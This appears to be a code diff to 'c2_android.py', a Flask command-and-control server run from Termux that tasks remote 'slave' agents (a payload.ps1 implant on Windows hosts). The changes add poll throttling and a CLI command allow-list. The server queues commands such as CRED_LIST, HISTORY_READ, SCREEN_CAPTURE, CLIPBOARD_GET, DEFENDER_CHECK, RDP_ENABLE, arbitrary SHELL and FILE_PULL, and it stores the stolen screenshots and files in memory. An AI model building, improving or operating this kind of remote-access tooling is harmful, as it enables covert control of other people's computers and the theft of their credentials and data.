@@ -2,25 +2,28 @@
 """
 M4NT1S C2 — Android / Termux, in-memory only.
 
+Not the native development branch. Feature parity with the Windows c2.py
+is deliberately not a goal: this is the checkup/relay tool for a rooted
+Android host. Anything that requires an interactive session (stream,
+TASK_CLEANUP, FILE_PUSH) is either absent or handled by the Windows C2.
+
 No SQLite, no JSON, no uploads/, no screenshots/. Everything lives in
-Python dicts and dies when the process exits. The Windows c2.py is
-still the full-featured C2; this is the checkup/relay tool for Android.
+Python dicts and dies when the process exits.
 
 Token:
-  Read from C2_TOKEN env var. If unset, a fresh random token is
-  generated each run and printed in the banner. Nothing is written to
-  disk. Set C2_TOKEN in .bashrc if you want a stable token.
+  Read from C2_TOKEN env var. If unset, a fresh random token is generated
+  each run and printed in the banner. Set C2_TOKEN in .bashrc if you want
+  a stable token across restarts.
 
 Self-healing:
-  When an agent polls with an id this C2 has never seen (typical after
-  a C2 restart, or after switching from the Windows C2), the poll
-  reply is {"command": "RE-REGISTER"}. payload.ps1 handles that by
-  calling /register again and updating its cached id.
+  When an agent polls with an id this C2 has never seen (typical after a
+  C2 restart, or after switching from the Windows C2), the poll reply is
+  {"command": "RE-REGISTER"}. payload.ps1 handles that by calling
+  /register again and updating its cached id.
 
 Screenshots / pulled files:
-  Kept in memory and served from /api/v1/image/<task_id> and
-  /api/v1/file/<task_id>. They vanish on C2 restart — save to disk
-  from the browser if you want them kept.
+  Kept in memory and served from /api/v1/image/<tid> and /api/v1/file/<tid>.
+  Vanish on C2 restart — save from the browser if you want them kept.
 
 Usage:
     python3 c2_android.py                          C2 on 127.0.0.1:5000
@@ -46,7 +49,6 @@ import threading
 import time
 import urllib.error
 import urllib.request
-from io import BytesIO
 
 from flask import Flask, Response, jsonify, request
 
@@ -68,12 +70,12 @@ SERVER_URL = TUNNEL_URL
 # ---------------------------------------------------------------------------
 _lock = threading.Lock()
 
-_slaves: dict[int, dict] = {}         # id -> slave record
-_tasks:  dict[int, dict] = {}         # task_id -> task record
-_pending: dict[int, list[int]] = {}   # slave_id -> [pending task_id, ...]
-_screenshots: dict[int, bytes] = {}   # task_id -> jpeg bytes
-_files: dict[int, dict] = {}          # task_id -> {'name': str, 'blob': bytes}
-_frames: dict[int, bytes] = {}        # slave_id -> latest jpeg frame
+_slaves: dict[int, dict] = {}
+_tasks:  dict[int, dict] = {}
+_pending: dict[int, list[int]] = {}
+_screenshots: dict[int, bytes] = {}
+_files: dict[int, dict] = {}
+_frames: dict[int, bytes] = {}
 
 _next_slave_id = 0
 _next_task_id  = 0
@@ -142,20 +144,23 @@ def _log(msg, slave_id=None, task_id=None):
 def _emit_slave(slave_id):
     with _lock:
         s = _slaves.get(slave_id)
-        if s:
-            s_copy = dict(s)
-    if s_copy if False else False:
-        pass
-    if slave_id in _slaves:
-        broadcast.emit('slave', s_copy)
-
-# Fix: the above has a scoping bug. Simpler:
-def _emit_slave(slave_id):
-    with _lock:
-        s = _slaves.get(slave_id)
         payload = dict(s) if s else None
     if payload:
         broadcast.emit('slave', payload)
+
+# Throttle slave-record emissions driven by poll events. Polls arrive
+# ~1 Hz per agent; emitting on every one would spam SSE. 10 s keeps the
+# UI's `online` dot and `last_seen` field fresh without the noise.
+_last_slave_emit: dict[int, float] = {}
+_last_slave_emit_lock = threading.Lock()
+
+def _maybe_emit_slave(slave_id, min_interval=10.0):
+    now = time.time()
+    with _last_slave_emit_lock:
+        if now - _last_slave_emit.get(slave_id, 0.0) < min_interval:
+            return
+        _last_slave_emit[slave_id] = now
+    _emit_slave(slave_id)
 
 # ---------------------------------------------------------------------------
 # FLASK
@@ -292,8 +297,7 @@ def _queue_task(slave_id, command, payload):
         return tid
 
 def _poll_next(slave_id):
-    """Returns ('unknown', None) if id not registered, ('nop', None) if
-    nothing queued, or ('task', task_dict)."""
+    """Returns ('unknown', None), ('nop', None), or ('task', task_dict)."""
     with _lock:
         if slave_id not in _slaves:
             return 'unknown', None
@@ -317,7 +321,6 @@ AGENT_ENDPOINTS = {
     '/api/v1/register',
     '/api/v1/poll',
     '/api/v1/result',
-    '/api/v1/stream',
 }
 
 @app.before_request
@@ -362,6 +365,9 @@ def poll():
     if kind == 'unknown':
         _log(f"[!] unknown poll id {sid} — RE-REGISTER sent")
         return jsonify({'command': 'RE-REGISTER'})
+
+    _maybe_emit_slave(sid)
+
     if kind == 'nop':
         return jsonify({'command': 'NOP'})
     return jsonify({
@@ -395,7 +401,6 @@ def result():
     if sid is None:
         return jsonify({'status': 'ok'})
 
-    # IMAGE
     if output.startswith('IMAGE:'):
         try:
             img = base64.b64decode(output[6:])
@@ -409,7 +414,6 @@ def result():
             _log(f"[!] image decode: {e}", slave_id=sid)
         return jsonify({'status': 'ok'})
 
-    # FILE
     if output.startswith('FILE:'):
         try:
             rest = output[5:]
@@ -427,7 +431,6 @@ def result():
             _log(f"[!] file decode: {e}", slave_id=sid)
         return jsonify({'status': 'ok'})
 
-    # STATUS → update admin/domain
     if cmd == 'STATUS':
         with _lock:
             s = _slaves.get(sid)
@@ -439,7 +442,6 @@ def result():
                         user = line.split(':', 1)[1].strip()
                         dom = user.split('\\', 1)[0] if '\\' in user else 'WORKGROUP'
                         s['domain'] = dom
-        _emit_slave(sid)
 
     if cmd == 'SYSINFO':
         with _lock:
@@ -448,7 +450,6 @@ def result():
                 for line in output.splitlines():
                     if line.startswith('Domain:'):
                         s['domain'] = line.split(':', 1)[1].strip()
-        _emit_slave(sid)
 
     if cmd == 'TRIANGULATE':
         _log(_parse_wifi(output), slave_id=sid, task_id=tid)
@@ -705,13 +706,10 @@ header .status.err { color:var(--warn); }
             <option value="DNS_CACHE">DNS cache</option>
             <option value="DEFENDER_CHECK">Defender</option>
             <option value="PERSIST_LIST">Persistence</option>
-            <option value="TASK_CLEANUP">Cleanup</option>
           </optgroup>
           <optgroup label="Collect">
             <option value="CRED_LIST">Credentials</option>
             <option value="HISTORY_READ">PS history</option>
-            <option value="SCREEN_STREAM_START">Stream start</option>
-            <option value="SCREEN_STREAM_STOP">Stream stop</option>
           </optgroup>
           <optgroup label="Shell">
             <option value="SHELL">Shell command</option>
@@ -852,8 +850,6 @@ function cmdPayload() {
   } else if (cmd === 'FILE_PULL') {
     if (!val) { addLog('FILE_PULL needs a path', 'warn'); return null; }
     payload = { path: val };
-  } else if (cmd === 'SCREEN_STREAM_START') {
-    payload = { interval_ms: parseInt(val, 10) || 500 };
   }
   return { slave_id: sid, command: cmd, payload };
 }
@@ -970,6 +966,14 @@ def web_ui():
 # ---------------------------------------------------------------------------
 # CLI MODE
 # ---------------------------------------------------------------------------
+CLI_ALLOWED = {
+    "STATUS", "SYSINFO", "SHELL", "SCREEN_CAPTURE", "TRIANGULATE",
+    "CLIPBOARD_GET", "PROCESSES", "NETWORK_INFO", "DNS_CACHE",
+    "DEFENDER_CHECK", "PERSIST_LIST", "KILLSWITCH",
+    "FILE_PULL", "CRED_LIST", "HISTORY_READ",
+    "RDP_ENABLE", "RDP_DISABLE",
+}
+
 def _http(method, path, data=None, timeout=30):
     url = f"{SERVER_URL}{path}"
     headers = {'Content-Type': 'application/json'}
@@ -996,15 +1000,16 @@ def cli_main(args):
     sid = int(args[0])
     command = args[1].upper()
 
+    if command not in CLI_ALLOWED:
+        print(f"  '{command}' not supported from CLI.")
+        print(f"  allowed: {', '.join(sorted(CLI_ALLOWED))}")
+        sys.exit(1)
+
     payload = None
     if command == 'SHELL' and len(args) > 2:
         payload = {'cmd': ' '.join(args[2:])}
     elif command == 'FILE_PULL' and len(args) > 2:
         payload = {'path': ' '.join(args[2:])}
-    elif command == 'SCREEN_STREAM_START':
-        try: ms = int(args[2]) if len(args) > 2 else 500
-        except Exception: ms = 500
-        payload = {'interval_ms': ms}
 
     print(f"  target: {SERVER_URL}")
     r = _http('POST', '/api/v1/command',
